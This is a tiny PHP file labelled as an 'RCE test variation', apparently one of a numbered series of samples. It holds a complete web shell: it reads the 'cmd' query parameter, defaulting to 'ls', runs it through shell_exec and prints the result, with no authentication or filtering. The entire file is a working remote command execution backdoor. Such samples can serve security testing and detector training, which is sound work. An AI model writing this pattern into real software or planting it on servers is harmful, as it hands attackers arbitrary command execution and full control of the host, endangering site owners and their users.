<?php
// RCE test variation #871
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>